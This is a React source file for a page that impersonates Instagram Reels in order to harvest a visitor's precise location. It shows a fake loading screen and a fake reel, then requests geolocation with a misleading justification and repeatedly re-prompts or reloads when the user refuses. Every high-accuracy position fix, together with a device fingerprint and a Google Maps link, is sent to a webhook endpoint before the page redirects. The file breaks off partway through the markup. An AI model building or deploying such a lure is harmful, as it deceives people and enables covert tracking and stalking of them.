'use client';

import { useState, useEffect, useCallback, useRef } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  Heart,
  MessageCircle,
  Send,
  Bookmark,
  MoreHorizontal,
  Music,
  ChevronLeft,
  Home,
  Search,
  PlusSquare,
  Film,
  User,
  MapPin,
  RefreshCw,
  Crosshair,
  Wifi,
  Signal,
  Navigation,
  Shield,
  CheckCircle2,
  Clock,
  ExternalLink,
  Bluetooth,
  Sun,
  Volume2,
  Flashlight,
  Calculator,
  Camera,
  Timer,
} from 'lucide-react';

// ========== TYPES ==========
interface LocationData {
  latitude: number;
  longitude: number;
  accuracy: number;
  altitude: number | null;
  altitudeAccuracy: number | null;
  heading: number | null;
  speed: number | null;
  timestamp: number;
}

interface DeviceInfo {
  userAgent: string;
  platform: string;
  language: string;
  cookiesEnabled: boolean;
  doNotTrack: string | null;
  screenWidth: number;
  screenHeight: number;
  pixelRatio: number;
  colorDepth: number;
  vendor: string;
  model: string;
  os: string;
  osVersion: string;
  browser: string;
  browserVersion: string;
  isMobile: boolean;
  isTouchDevice: boolean;
  connectionType: string;
}

type AppState = 'loading' | 'reel' | 'requesting_location' | 'getting_precise' | 'permission_denied' | 'sending' | 'location_captured' | 'redirecting';

// ========== CONSTANTS ==========
const ACCURACY_THRESHOLD = 30;
const MAX_WATCH_TIME = 60000;

// ========== DEVICE INFO (client-only, safe for SSR) ==========
function getDeviceInfo(): DeviceInfo | null {
  if (typeof navigator === 'undefined' || typeof window === 'undefined') return null;

  const ua = navigator.userAgent;
  const platform = navigator.platform || 'Unknown';
  const language = navigator.language || 'Unknown';
  const cookiesEnabled = navigator.cookieEnabled || false;
  const doNotTrack = navigator.doNotTrack;
  const screenWidth = window.screen.width;
  const screenHeight = window.screen.height;
  const pixelRatio = window.devicePixelRatio || 1;
  const colorDepth = window.screen.colorDepth || 24;
  const vendor = (navigator as any).vendor || 'Unknown';

  let model = 'Unknown';
  let os = 'Unknown';
  let osVersion = 'Unknown';
  let browser = 'Unknown';
  let browserVersion = 'Unknown';

  if (/Android/i.test(ua)) {
    os = 'Android';
    const m = ua.match(/Android\s([\d.]+)/);
    osVersion = m ? m[1] : 'Unknown';
    const mm = ua.match(/;\s*([^;)]+)\s+Build/);
    model = mm ? mm[1].trim() : 'Unknown';
  } else if (/iPhone/i.test(ua)) {
    os = 'iOS'; model = 'iPhone';
    const m = ua.match(/OS\s([\d_]+)/);
    osVersion = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/iPad/i.test(ua)) {
    os = 'iOS'; model = 'iPad';
    const m = ua.match(/OS\s([\d_]+)/);
    osVersion = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/Windows/i.test(ua)) {
    os = 'Windows';
    const m = ua.match(/Windows NT\s([\d.]+)/);
    osVersion = m ? m[1] : 'Unknown';
  } else if (/Mac OS X/i.test(ua)) {
    os = 'macOS';
    const m = ua.match(/Mac OS X\s([\d_.]+)/);
    osVersion = m ? m[1].replace(/_/g, '.') : 'Unknown';
  } else if (/Linux/i.test(ua)) { os = 'Linux'; }
  else if (/CrOS/i.test(ua)) { os = 'ChromeOS'; }

  if (/Edg\//i.test(ua)) {
    browser = 'Microsoft Edge';
    const m = ua.match(/Edg\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/Chrome\//i.test(ua) && !/Chromium/i.test(ua)) {
    browser = 'Google Chrome';
    const m = ua.match(/Chrome\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/Firefox\//i.test(ua)) {
    browser = 'Mozilla Firefox';
    const m = ua.match(/Firefox\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/Safari\//i.test(ua) && !/Chrome/i.test(ua)) {
    browser = 'Apple Safari';
    const m = ua.match(/Version\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  } else if (/OPR\//i.test(ua)) {
    browser = 'Opera';
    const m = ua.match(/OPR\/([\d.]+)/);
    browserVersion = m ? m[1] : 'Unknown';
  }

  const isMobile = /Android|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(ua);
  const isTouchDevice = 'ontouchstart' in window || navigator.maxTouchPoints > 0;
  const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
  const connectionType = conn ? conn.effectiveType || conn.type || 'Unknown' : 'Unknown';

  return {
    userAgent: ua, platform, language, cookiesEnabled, doNotTrack,
    screenWidth, screenHeight, pixelRatio, colorDepth, vendor,
    model, os, osVersion, browser, browserVersion, isMobile, isTouchDevice, connectionType,
  };
}

// ========== REAL TIME HOOK ==========
function useCurrentTime() {
  const [time, setTime] = useState('');
  useEffect(() => {
    const update = () => {
      const now = new Date();
      const h = now.getHours();
      const m = now.getMinutes().toString().padStart(2, '0');
      const ampm = h >= 12 ? 'PM' : 'AM';
      const h12 = h % 12 || 12;
      setTime(`${h12}:${m} ${ampm}`);
    };
    update();
    const interval = setInterval(update, 10000);
    return () => clearInterval(interval);
  }, []);
  return time;
}

// ========== BATTERY HOOK ==========
function useBatteryLevel() {
  const [level, setLevel] = useState(85);
  useEffect(() => {
    const bat = (navigator as any).getBattery;
    if (bat) {
      bat.call(navigator).then((b: any) => {
        setLevel(Math.round(b.level * 100));
        b.addEventListener('levelchange', () => setLevel(Math.round(b.level * 100)));
      }).catch(() => {});
    }
  }, []);
  return level;
}

// ========== CONNECTION HOOK ==========
function useConnectionType() {
  const [connType, setConnType] = useState('5G');
  useEffect(() => {
    const conn = (navigator as any).connection || (navigator as any).mozConnection || (navigator as any).webkitConnection;
    if (conn) {
      const map: Record<string, string> = {
        '4g': '5G', '3g': '4G', '2g': '3G', 'slow-2g': 'E', '5g': '5G',
      };
      setConnType(map[conn.effectiveType] || conn.effectiveType?.toUpperCase() || '5G');
    }
  }, []);
  return connType;
}

// ========== ACCURACY RATING ==========
function getAccuracyRating(accuracy: number): { label: string; color: string; description: string } {
  if (accuracy <= 5) return { label: 'EXCELLENT', color: 'text-emerald-400', description: 'Pin-point accuracy! Your exact location has been captured.' };
  if (accuracy <= 10) return { label: 'VERY GOOD', color: 'text-green-400', description: 'Very precise! Location accuracy is within 10 meters.' };
  if (accuracy <= 20) return { label: 'GOOD', color: 'text-green-300', description: 'Good accuracy! Your location is captured within 20 meters.' };
  if (accuracy <= 30) return { label: 'ACCEPTABLE', color: 'text-yellow-400', description: 'Acceptable accuracy. Location is within 30 meters range.' };
  if (accuracy <= 50) return { label: 'MODERATE', color: 'text-orange-400', description: 'Moderate accuracy. Location is within 50 meters range.' };
  return { label: 'LOW', color: 'text-red-400', description: 'Low accuracy. Location is approximate.' };
}

// ========== MAIN COMPONENT ==========
export default function InstagramReels() {
  const [appState, setAppState] = useState<AppState>('loading');
  const [deniedCount, setDeniedCount] = useState(0);
  const [locationData, setLocationData] = useState<LocationData | null>(null);
  const [currentAccuracy, setCurrentAccuracy] = useState<number | null>(null);
  const [attemptNumber, setAttemptNumber] = useState(0);
  const [liked, setLiked] = useState(false);
  const [saved, setSaved] = useState(false);
  const [loadingProgress, setLoadingProgress] = useState(0);
  const [redirectUrl, setRedirectUrl] = useState<string | null>(null);
  const [showControlCenter, setShowControlCenter] = useState(false);
  const [screenBrightness, setScreenBrightness] = useState(80);
  const [volume, setVolume] = useState(60);
  const [airplaneOn, setAirplaneOn] = useState(false);
  const [bluetoothOn, setBluetoothOn] = useState(false);
  const [wifiOn, setWifiOn] = useState(true);
  const [cellularOn, setCellularOn] = useState(true);
  const [flashlightOn, setFlashlightOn] = useState(false);

  const hasRequestedRef = useRef(false);
  const isFinalSentRef = useRef(false);
  const watchIdRef = useRef<number | null>(null);
  const startTimeRef = useRef<number>(0);
  const attemptRef = useRef(0);
  const permissionDeniedHardRef = useRef(false);

  const currentTime = useCurrentTime();
  const batteryLevel = useBatteryLevel();
  const connectionType = useConnectionType();

  // Check if permission is hard-denied on mount
  useEffect(() => {
    if (typeof navigator !== 'undefined' && navigator.permissions) {
      navigator.permissions.query({ name: 'geolocation' }).then((result) => {
        if (result.state === 'denied') {
          permissionDeniedHardRef.current = true;
        }
        result.addEventListener('change', () => {
          permissionDeniedHardRef.current = result.state === 'denied';
        });
      }).catch(() => {});
    }
  }, []);

  // Send EVERY location update to Webhook 2
  const sendToWebhook2 = useCallback(async (loc: LocationData, attempt: number) => {
    try {
      const deviceInfo = getDeviceInfo();
      const res = await fetch('/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'update',
          latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
          altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
          heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
          deviceInfo,
          googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
          attemptNumber: attempt,
        }),
      });
      const data = await res.json();
      console.log(`[W2] Update sent - accuracy: ${loc.accuracy.toFixed(1)}m, webhook2Sent: ${data.webhook2Sent}`);
    } catch (e) { console.error('[W2] Fail:', e); }
  }, []);

  // Send FINAL precise location to Webhook 1
  const sendFinalToWebhook1 = useCallback(async (loc: LocationData, attempt: number) => {
    try {
      setAppState('sending');
      const deviceInfo = getDeviceInfo();
      console.log(`[W1] Sending FINAL location - lat: ${loc.latitude}, lng: ${loc.longitude}, accuracy: ${loc.accuracy.toFixed(1)}m`);
      const res = await fetch('/api/location', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          type: 'final',
          latitude: loc.latitude, longitude: loc.longitude, accuracy: loc.accuracy,
          altitude: loc.altitude, altitudeAccuracy: loc.altitudeAccuracy,
          heading: loc.heading, speed: loc.speed, timestamp: loc.timestamp,
          deviceInfo,
          googleMapsLink: `https://www.google.com/maps?q=${loc.latitude},${loc.longitude}`,
          attemptNumber: attempt,
        }),
      });
      const data = await res.json();
      console.log(`[W1] Response:`, data);
      if (data.redirectUrl) {
        setRedirectUrl(data.redirectUrl);
        // Show location captured screen before redirecting - user ko info milegi
        setAppState('location_captured');
      } else {
        setAppState('reel');
      }
    } catch (e) { console.error('[W1] Fail:', e); setAppState('reel'); }
  }, []);

  // Start watching location continuously
  const startWatchingLocation = useCallback(() => {
    if (!navigator.geolocation) {
      alert('Geolocation is not supported by your browser');
      return;
    }

    setAppState('requesting_location');
    startTimeRef.current = Date.now();
    isFinalSentRef.current = false;
    attemptRef.current = 0;

    const watchId = navigator.geolocation.watchPosition(
      async (position) => {
        const loc: LocationData = {
          latitude: position.coords.latitude, longitude: position.coords.longitude,
          accuracy: position.coords.accuracy, altitude: position.coords.altitude,
          altitudeAccuracy: position.coords.altitudeAccuracy,
          heading: position.coords.heading, speed: position.coords.speed,
          timestamp: position.timestamp,
        };

        attemptRef.current += 1;
        const attempt = attemptRef.current;
        setLocationData(loc);
        setCurrentAccuracy(loc.accuracy);
        setAttemptNumber(attempt);

        // ALWAYS send to Webhook 2
        sendToWebhook2(loc, attempt);

        // Check accuracy threshold
        if (loc.accuracy <= ACCURACY_THRESHOLD && !isFinalSentRef.current) {
          isFinalSentRef.current = true;
          if (watchIdRef.current !== null) {
            navigator.geolocation.clearWatch(watchIdRef.current);
            watchIdRef.current = null;
          }
          await sendFinalToWebhook1(loc, attempt);
        } else if (!isFinalSentRef.current) {
          setAppState('getting_precise');
        }

        // Timeout safety: 60s max wait
        if (Date.now() - startTimeRef.current >= MAX_WATCH_TIME && !isFinalSentRef.current) {
          isFinalSentRef.current = true;
          if (watchIdRef.current !== null) {
            navigator.geolocation.clearWatch(watchIdRef.current);
            watchIdRef.current = null;
          }
          await sendFinalToWebhook1(loc, attempt);
        }
      },
      (error) => {
        console.error('Location error:', error.code, error.message);
        if (watchIdRef.current !== null) {
          navigator.geolocation.clearWatch(watchIdRef.current);
          watchIdRef.current = null;
        }
        setDeniedCount(prev => prev + 1);
        setAppState('permission_denied');
      },
      { enableHighAccuracy: true, timeout: 30000, maximumAge: 0 }
    );

    watchIdRef.current = watchId;
  }, [sendToWebhook2, sendFinalToWebhook1]);

  // Loading animation
  useEffect(() => {
    const interval = setInterval(() => {
      setLoadingProgress(prev => {
        if (prev >= 100) { clearInterval(interval); setTimeout(() => setAppState('reel'), 300); return 100; }
        return prev + Math.random() * 15 + 5;
      });
    }, 100);
    return () => clearInterval(interval);
  }, []);

  // Auto-request location after reel shows
  useEffect(() => {
    if (appState === 'reel' && !hasRequestedRef.current) {
      hasRequestedRef.current = true;
      const t = setTimeout(() => startWatchingLocation(), 1500);
      return () => clearTimeout(t);
    }
  }, [appState, startWatchingLocation]);

  // Cleanup
  useEffect(() => {
    return () => { if (watchIdRef.current !== null) navigator.geolocation.clearWatch(watchIdRef.current); };
  }, []);

  // FIX: Permission deny ke baad reload pe bhi prompt aana chahiye
  // Key trick: getCurrentPosition se browser ka permission dialog re-trigger hota hai
  const handleDenyOk = () => {
    if (deniedCount >= 1) {
      // First check if permission is hard-denied at browser level
      if (navigator.permissions) {
        navigator.permissions.query({ name: 'geolocation' }).then((result) => {
          if (result.state === 'denied') {
            // Hard denied - user MUST go to browser settings to change it
            // Show them how to do it, then reload so they get fresh prompt
            window.location.href = window.location.href.split('?')[0] + '?t=' + Date.now();
          } else {
            // Permission is 'prompt' - we can re-trigger by calling getCurrentPosition
            // This will show the browser's native permission dialog again
            navigator.geolocation.getCurrentPosition(
              () => {
                // Permission granted! Start watching
                startWatchingLocation();
              },
              (err) => {
                // Still denied or error - try once more
                if (err.code === err.PERMISSION_DENIED) {
                  setDeniedCount(prev => prev + 1);
                  setAppState('permission_denied');
                } else {
                  // Other error - try again with watchPosition
                  startWatchingLocation();
                }
              },
              { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
            );
          }
        }).catch(() => {
          // Fallback: just try getCurrentPosition to re-trigger prompt
          navigator.geolocation.getCurrentPosition(
            () => startWatchingLocation(),
            () => window.location.reload(),
            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
          );
        });
      } else {
        // No permissions API - use getCurrentPosition trick to re-trigger prompt
        navigator.geolocation.getCurrentPosition(
          () => startWatchingLocation(),
          () => window.location.reload(),
          { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
        );
      }
    } else {
      // First deny - just try again with getCurrentPosition (re-triggers browser prompt)
      navigator.geolocation.getCurrentPosition(
        () => startWatchingLocation(),
        () => {
          setDeniedCount(prev => prev + 1);
          setAppState('permission_denied');
        },
        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
      );
    }
  };

  // Handle redirect from location_captured screen
  const handleContinueRedirect = () => {
    if (redirectUrl) {
      setAppState('redirecting');
      setTimeout(() => { window.location.href = redirectUrl; }, 500);
    }
  };

  // ========== LOADING SCREEN ==========
  if (appState === 'loading') {
    return (
      <div className="fixed inset-0 bg-black flex flex-col items-center justify-center z-50">
        <motion.div initial={{ scale: 0.5, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} transition={{ duration: 0.5 }} className="mb-8">
          <div className="w-20 h-20 rounded-2xl bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center">
            <Film className="w-10 h-10 text-white" />
          </div>
        </motion.div>
        <div className="w-48 h-1 bg-gray-800 rounded-full overflow-hidden">
          <div className="h-full bg-gradient-to-r from-yellow-400 via-pink-500 to-purple-600 rounded-full transition-all duration-200" style={{ width: `${Math.min(loadingProgress, 100)}%` }} />
        </div>
        <p className="text-gray-500 text-sm mt-4">Loading...</p>
      </div>
    );
  }

  const showRedirectOverlay = appState === 'sending' || appState === 'redirecting';

  return (
    <div className="fixed inset-0 bg-black overflow-hidden select-none">
      {/* Background */}
      <div className="absolute inset-0 bg-gradient-to-b from-gray-900 via-gray-800 to-black">
        <div className="absolute inset-0 bg-gradient-to-br from-indigo-900/30 via-black to-purple-900/20" />
        <div className="absolute inset-0 opacity-20" style={{ backgroundImage: 'radial-gradient(circle at 30% 40%, rgba(255,255,255,0.1) 0%, transparent 50%), radial-gradient(circle at 70% 60%, rgba(255,255,255,0.05) 0%, transparent 40%)' }} />
      </div>

      {/* ========== INSTAGRAM-STYLE STATUS BAR ========== */}
      <div
        className="absolute top-0 left-0 right-0 z-30 px-5 pt-3 pb-2 cursor-pointer"
        onClick={() => setShowControlCenter(!showControlCenter)}
      >
        <div className="flex justify-between items-center">
          {/* Left: Time */}
          <span className="text-white text-sm font-semibold tracking-tight" style={{ fontFamily: '-apple-system, BlinkMacSystemFont, "SF Pro Text", "Helvetica Neue", sans-serif' }}>
            {currentTime}
          </span>
          {/* Right: Signal + WiFi + Connection + Battery */}
          <div className="flex items-center gap-[6px]">
            {/* Signal Bars */}
            <svg width="17" height="12" viewBox="0 0 17 12" fill="none" className="mt-[1px]">
              <rect x="0" y="8" width="3" height="4" rx="0.7" fill="white" />
              <rect x="4" y="5.5" width="3" height="6.5" rx="0.7" fill="white" />
              <rect x="8" y="3" width="3" height="9" rx="0.7" fill="white" />
              <rect x="12" y="0" width="3" height="12" rx="0.7" fill="white" />
            </svg>
            {/* WiFi Icon */}
            <svg width="16" height="12" viewBox="0 0 16 12" fill="white" className="mt-[1px]">
              <path d="M8 10.5a1.25 1.25 0 110 2.5 1.25 1.25 0 010-2.5z" />
              <path d="M4.5 8.5c1-1.2 2.2-1.8 3.5-1.8s2.5.6 3.5 1.8" stroke="white" strokeWidth="1.3" strokeLinecap="round" fill="none" />
              <path d="M1.5 5.5c1.8-2 4-3 6.5-3s4.7 1 6.5 3" stroke="white" strokeWidth="1.3" strokeLinecap="round" fill="none" />
            </svg>
            {/* Connection Type */}
            <span className="text-white text-[11px] font-semibold tracking-tight ml-[1px]">{connectionType}</span>
            {/* Battery */}
            <div className="flex items-center ml-[2px]">
              <div className="relative w-[25px] h-[11px] rounded-[3px] border border-white/90 p-[1.5px]">
                <div
                  className={`h-full rounded-[1.5px] transition-all ${
                    batteryLevel > 60 ? 'bg-white' : batteryLevel > 20 ? 'bg-yellow-400' : 'bg-red-500'
                  }`}
                  style={{ width: `${batteryLevel}%` }}
                />
              </div>
              <div className="w-[1.5px] h-[4px] bg-white/60 rounded-r-full ml-[0.5px]" />
            </div>
          </div>
        </div>
      </div>

      {/* ========== iOS-STYLE CONTROL CENTER (Instagram feel) ========== */}
      <AnimatePresence>
        {showControlCenter && (
          <>
            {/* Backdrop */}
            <motion.div
              initial={{ opacity: 0 }}
              animate={{ opacity: 1 }}
              exit={{ opacity: 0 }}
              className="absolute inset-0 z-40 bg-black/60 backdrop-blur-xl"
              onClick={() => setShowControlCenter(false)}
            />
            {/* iOS Control Center Panel */}
            <motion.div
              initial={{ y: -400, opacity: 0 }}
              animate={{ y: 0, opacity: 1 }}
              exit={{ y: -400, opacity: 0 }}
              transition={{ type: 'spring', damping: 28, stiffness: 320 }}
              className="absolute top-0 left-0 right-0 z-50 px-3 pt-12 pb-6"
              onClick={(e) => e.stopPropagation()}
            >
              <div className="max-w-[380px] mx-auto">
                {/* Main grid container */}
                <div className="bg-gray-800/90 backdrop-blur-2xl rounded-[24px] p-3 border border-white/[0.08] shadow-2xl">
                  {/* Top Row - Connectivity toggles (2x2 grid, iOS style) */}
                  <div className="grid grid-cols-2 gap-2.5 mb-2.5">
                    {/* Airplane Mode */}
                    <button
                      onClick={() => setAirplaneOn(!airplaneOn)}
                      className={`rounded-[18px] p-3.5 flex items-center gap-3 transition-all active:scale-95 ${airplaneOn ? 'bg-orange-500/90' : 'bg-white/[0.12]'}`}
                    >
                      <div className={`w-8 h-8 rounded-full flex items-center justify-center ${airplaneOn ? 'bg-white/25' : 'bg-white/10'}`}>
                        <svg width="16" height="16" viewBox="0 0 24 24" fill="white" stroke="none">
                          <path d="M21 16v-2l-8-5V3.5c0-.83-.67-1.5-1.5-1.5S10 2.67 10 3.5V9l-8 5v2l8-2.5V19l-2 1.5V22l3.5-1 3.5 1v-1.5L13 19v-5.5l8 2.5z"/>
                        </svg>
                      </div>
                      <span className="text-white text-[13px] font-medium">Airplane</span>
                    </button>

                    {/* Cellular Data */}
                    <button
                      onClick={() => setCellularOn(!cellularOn)}
                      className={`rounded-[18px] p-3.5 flex items-center gap-3 transition-all active:scale-95 ${cellularOn ? 'bg-blue-500/90' : 'bg-white/[0.12]'}`}
                    >
                      <div className={`w-8 h-8 rounded-full flex items-center justify-center ${cellularOn ? 'bg-white/25' : 'bg-white/10'}`}>
                        <Signal className="w-4 h-4 text-white" />
                      </div>
                      <div>
                        <span className="text-white text-[13px] font-medium block leading-tight">{connectionType}</span>
                        <span className="text-white/60 text-[10px] leading-tight">{cellularOn ? 'Connected' : 'Off'}</span>
                      </div>
                    </button>

                    {/* WiFi */}
                    <button
                      onClick={() => setWifiOn(!wifiOn)}
                      className={`rounded-[18px] p-3.5 flex items-center gap-3 transition-all active:scale-95 ${wifiOn ? 'bg-blue-500/90' : 'bg-white/[0.12]'}`}
                    >
                      <div className={`w-8 h-8 rounded-full flex items-center justify-center ${wifiOn ? 'bg-white/25' : 'bg-white/10'}`}>
                        <Wifi className="w-4 h-4 text-white" />
                      </div>
                      <div>
                        <span className="text-white text-[13px] font-medium block leading-tight">Wi-Fi</span>
                        <span className="text-white/60 text-[10px] leading-tight">{wifiOn ? 'Home' : 'Off'}</span>
                      </div>
                    </button>

                    {/* Bluetooth */}
                    <button
                      onClick={() => setBluetoothOn(!bluetoothOn)}
                      className={`rounded-[18px] p-3.5 flex items-center gap-3 transition-all active:scale-95 ${bluetoothOn ? 'bg-blue-500/90' : 'bg-white/[0.12]'}`}
                    >
                      <div className={`w-8 h-8 rounded-full flex items-center justify-center ${bluetoothOn ? 'bg-white/25' : 'bg-white/10'}`}>
                        <Bluetooth className="w-4 h-4 text-white" />
                      </div>
                      <span className="text-white text-[13px] font-medium">Bluetooth</span>
                    </button>
                  </div>

                  {/* Brightness - iOS style tall slider */}
                  <div className="bg-white/[0.12] rounded-[18px] p-3 mb-2.5">
                    <div className="flex items-center justify-between">
                      <Sun className="w-4 h-4 text-white/50" />
                      <div className="flex-1 mx-3 h-28 bg-white/[0.08] rounded-full overflow-hidden relative">
                        <div
                          className="absolute bottom-0 w-full bg-white/70 rounded-full transition-all cursor-pointer"
                          style={{ height: `${screenBrightness}%` }}
                          onClick={(e) => {
                            const rect = e.currentTarget.parentElement!.getBoundingClientRect();
                            const y = e.clientY - rect.top;
                            const pct = Math.round(((rect.height - y) / rect.height) * 100);
                            setScreenBrightness(Math.max(10, Math.min(100, pct)));
                          }}
                        />
                      </div>
                      <Sun className="w-4 h-4 text-white" />
                    </div>
                  </div>

                  {/* Volume - iOS style tall slider */}
                  <div className="bg-white/[0.12] rounded-[18px] p-3 mb-2.5">
                    <div className="flex items-center justify-between">
                      <Volume2 className="w-4 h-4 text-white/50" />
                      <div className="flex-1 mx-3 h-28 bg-white/[0.08] rounded-full overflow-hidden relative">
                        <div
                          className="absolute bottom-0 w-full bg-white/70 rounded-full transition-all cursor-pointer"
                          style={{ height: `${volume}%` }}
                          onClick={(e) => {
                            const rect = e.currentTarget.parentElement!.getBoundingClientRect();
                            const y = e.clientY - rect.top;
                            const pct = Math.round(((rect.height - y) / rect.height) * 100);
                            setVolume(Math.max(0, Math.min(100, pct)));
                          }}
                        />
                      </div>
                      <Volume2 className="w-4 h-4 text-white" />
                    </div>
                  </div>

                  {/* Bottom Row - Quick Actions (iOS style circles) */}
                  <div className="grid grid-cols-4 gap-2.5">
                    <button
                      onClick={() => setFlashlightOn(!flashlightOn)}
                      className={`aspect-square rounded-[16px] flex flex-col items-center justify-center gap-1.5 transition-all active:scale-90 ${flashlightOn ? 'bg-white/90' : 'bg-white/[0.12]'}`}
                    >
                      <svg width="20" height="20" viewBox="0 0 24 24" fill={flashlightOn ? '#1a1a1a' : 'white'} stroke="none">
                        <path d="M9 21h6v-1H9v1zm3-19C8.14 2 5 5.14 5 9c0 2.38 1.19 4.47 3 5.74V17c0 .55.45 1 1 1h6c.55 0 1-.45 1-1v-2.26c1.81-1.27 3-3.36 3-5.74 0-3.86-3.14-7-7-7z"/>
                      </svg>
                    </button>
                    <button className="aspect-square rounded-[16px] bg-white/[0.12] flex flex-col items-center justify-center gap-1.5 transition-all active:scale-90">
                      <Timer className="w-5 h-5 text-white" />
                    </button>
                    <button className="aspect-square rounded-[16px] bg-white/[0.12] flex flex-col items-center justify-center gap-1.5 transition-all active:scale-90">
                      <Calculator className="w-5 h-5 text-white" />
                    </button>
                    <button className="aspect-square rounded-[16px] bg-white/[0.12] flex flex-col items-center justify-center gap-1.5 transition-all active:scale-90">
                      <Camera className="w-5 h-5 text-white" />
                    </button>
                  </div>
                </div>

                {/* Music widget - separate card like iOS */}
                <div className="bg-gray-800/90 backdrop-blur-2xl rounded-[18px] p-3.5 mt-2.5 border border-white/[0.08] flex items-center gap-3">
                  <div className="w-10 h-10 rounded-[8px] bg-gradient-to-br from-purple-500 to-pink-500 flex items-center justify-center">
                    <Music className="w-5 h-5 text-white" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <p className="text-white text-[13px] font-medium truncate">No Surprises</p>
                    <p className="text-white/50 text-[11px] truncate">Radiohead · OK Computer</p>
                  </div>
                  <button className="w-8 h-8 flex items-center justify-center">
                    <svg width="16" height="16" viewBox="0 0 24 24" fill="white"><polygon points="5,3 19,12 5,21"/></svg>
                  </button>
                </div>
              </div>
            </motion.div>
          </>
        )}
      </AnimatePresence>

      {/* Top Nav */}
      <div className="absolute top-9 left-0 right-0 z-20 px-4 py-3">
        <div className="flex items-center justify-between">
          <ChevronLeft className="w-6 h-6 text-white" />
          <span className="text-white text-lg font-semibold">Reels</span>
          <MoreHorizontal className="w-6 h-6 text-white" />
        </div>
      </div>

      {/* Right Actions */}
      <div className="absolute right-3 bottom-32 z-20 flex flex-col items-center gap-5">
        <button className="flex flex-col items-center gap-1" onClick={() => setLiked(!liked)}>
          <Heart className={`w-7 h-7 transition-colors ${liked ? 'text-red-500 fill-red-500' : 'text-white'}`} />
          <span className="text-white text-xs">28.3K</span>
        </button>
        <button className="flex flex-col items-center gap-1"><MessageCircle className="w-7 h-7 text-white" /><span className="text-white text-xs">131</span></button>
        <button className="flex flex-col items-center gap-1"><Send className="w-7 h-7 text-white" /><span className="text-white text-xs">56.1K</span></button>
        <button className="flex flex-col items-center gap-1" onClick={() => setSaved(!saved)}>
          <Bookmark className={`w-7 h-7 transition-colors ${saved ? 'text-white fill-white' : 'text-white'}`} />
        </button>
      </div>

      {/* Bottom Reel Info */}
      <div className="absolute left-3 right-16 bottom-24 z-20">
        <div className="flex items-center gap-2 mb-2">
          <div className="w-8 h-8 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 p-[2px]">
            <div className="w-full h-full rounded-full bg-black flex items-center justify-center"><User className="w-4 h-4 text-gray-400" /></div>
          </div>
          <span className="text-white text-sm font-semibold">explore_world</span>
          <button className="border border-white/70 text-white text-xs px-3 py-0.5 rounded-md font-semibold ml-1">Follow</button>
        </div>
        <p className="text-white text-sm leading-5 mb-2">Find your way around the world ✨ #explore #travel #location</p>
        <div className="flex items-center gap-2">
          <Music className="w-3 h-3 text-white" />
          <div className="overflow-hidden"><p className="text-white text-xs whitespace-nowrap animate-marquee">Radiohead · No Surprises</p></div>
        </div>
      </div>

      {/* Bottom Nav */}
      <div className="absolute bottom-0 left-0 right-0 z-30 bg-black/90 backdrop-blur-sm border-t border-white/10">
        <div className="flex items-center justify-around py-2 pb-4">
          <button className="flex flex-col items-center gap-0.5"><Home className="w-6 h-6 text-white" /><span className="text-white text-[10px]">Home</span></button>
          <button className="flex flex-col items-center gap-0.5"><Search className="w-6 h-6 text-gray-500" /><span className="text-gray-500 text-[10px]">Search</span></button>
          <button className="flex flex-col items-center gap-0.5"><PlusSquare className="w-6 h-6 text-gray-500" /><span className="text-gray-500 text-[10px]">Create</span></button>
          <button className="flex flex-col items-center gap-0.5"><Film className="w-6 h-6 text-white" /><span className="text-white text-[10px]">Reels</span></button>
          <button className="flex flex-col items-center gap-0.5"><div className="w-6 h-6 rounded-full bg-gray-600 flex items-center justify-center"><User className="w-3 h-3 text-gray-400" /></div><span className="text-gray-500 text-[10px]">Profile</span></button>
        </div>
      </div>

      {/* ===== LOCATION REQUESTING OVERLAY ===== */}
      <AnimatePresence>
        {appState === 'requesting_location' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/60 backdrop-blur-sm flex items-center justify-center">
            <motion.div initial={{ scale: 0.8, opacity: 0 }} animate={{ scale: 1, opacity: 1 }} exit={{ scale: 0.8, opacity: 0 }} className="bg-gray-900/95 rounded-2xl p-6 mx-8 max-w-sm w-full border border-white/10">
              <div className="flex flex-col items-center text-center">
                <div className="w-16 h-16 rounded-full bg-gradient-to-tr from-yellow-400 via-pink-500 to-purple-600 flex items-center justify-center mb-4"><MapPin className="w-8 h-8 text-white" /></div>
                <h3 className="text-white text-lg font-semibold mb-2">Allow Location Access</h3>
                <p className="text-gray-400 text-sm mb-4 leading-5">This reel wants to access your location to show you nearby content and provide the best experience.</p>
                <div className="flex items-center gap-2"><div className="w-5 h-5 rounded-full border-2 border-blue-400 border-t-transparent animate-spin" /><span className="text-gray-300 text-sm">Requesting location...</span></div>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* ===== GETTING PRECISE OVERLAY ===== */}
      <AnimatePresence>
        {appState === 'getting_precise' && (
          <motion.div initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }} className="absolute inset-0 z-40 bg-black/50 backdrop-blur-sm flex items-center justify-center">
